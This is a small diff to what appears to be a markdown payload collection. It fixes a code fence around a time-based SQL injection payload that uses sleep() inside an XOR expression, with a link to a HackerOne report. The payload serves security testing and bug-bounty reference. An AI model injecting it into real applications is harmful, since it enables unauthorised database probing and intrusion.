@@ -94,8 +94,7 @@ OR
 📅 24-Nov-2020
 ## Time Based SQL Injection
 *2,077 millis*
-
-``sql
+```sql
 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
 ```
 **[more info](https://hackerone.com/reports/1024984)**
